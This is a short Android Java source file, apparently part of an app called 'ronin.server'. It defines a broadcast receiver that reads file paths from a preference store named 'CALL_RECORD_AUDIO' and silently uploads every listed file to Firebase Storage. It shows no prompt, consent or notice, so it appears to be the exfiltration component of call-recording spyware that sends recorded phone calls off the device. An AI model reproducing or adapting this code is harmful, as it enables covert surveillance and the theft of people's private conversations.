package com.ronin.server;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Upload_Task extends BroadcastReceiver {

    FirebaseStorage storage = FirebaseStorage.getInstance();
    StorageReference storageRef = storage.getReference();
    ExecutorService pool = Executors.newFixedThreadPool(5);

    class Go implements Runnable {
        String data;
        public Go(String data) {
            this.data = data;
        }

        @Override
        public void run() {
            upload(data);
        }

        void upload(String path){
            Uri file = Uri.fromFile(new File(path));
            StorageReference riversRef = storageRef.child("files/"+file.getLastPathSegment());
            UploadTask uploadTask = riversRef.putFile(file);

            uploadTask.addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception exception) {
                    Log.i("TASK","FAIL");
                }
            }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    Log.i("TASK","SUCCESS");
                }
            });
        }
    }


    @Override
    public void onReceive(Context context, Intent intent) {
        SharedPreferences sharedPref = context.getSharedPreferences("CALL_RECORD_AUDIO", Context.MODE_PRIVATE);

        Map<String,?> data =  sharedPref.getAll();

        for (Map.Entry<String, ?> entry : data.entrySet()) {
            pool.execute(new Thread(new Go(entry.getValue().toString())));
        }
    }

}
